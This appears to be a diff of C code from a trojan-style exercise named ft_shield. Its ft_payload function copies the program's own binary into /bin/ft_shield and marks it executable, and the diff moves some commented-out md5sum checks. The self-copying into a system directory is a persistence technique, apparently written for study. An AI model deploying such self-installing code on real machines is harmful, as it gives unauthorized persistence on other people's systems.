@@ -17,10 +17,13 @@ int ft_payload(t_troyan *shield)
     }
     while ((shield->bytes_read = fread(shield->buffer_exe, 1, 1024, shield->fd)) != 0)
         fwrite(shield->buffer_exe, 1, shield->bytes_read, shield->fd_dest);
-    printf("( %p )\n", shield->fd_dest);
     fclose(shield->fd);
     fclose(shield->fd_dest);
     chmod("/bin/ft_shield", 0755);
+    // printf("- Comprobamos que la copia de nuestro binario es exacta:\n");
+    // printf("--------------------------------------------------------\n");
+    // system("md5sum ./ft_shield /bin/ft_shield ");
+    // printf("--------------------------------------------------------\n");
     return(0);
 }
 
@@ -43,10 +46,6 @@ int main()
         free(shield);
         return (1);
     }
-    // printf("- Comprobamos que la copia de nuestro binario es exacta:\n");
-    // printf("--------------------------------------------------------\n");
-    // system("md5sum ./ft_shield /bin/ft_shield ");
-    // printf("--------------------------------------------------------\n");
     if (ft_payload(shield))
     {
         free(shield);
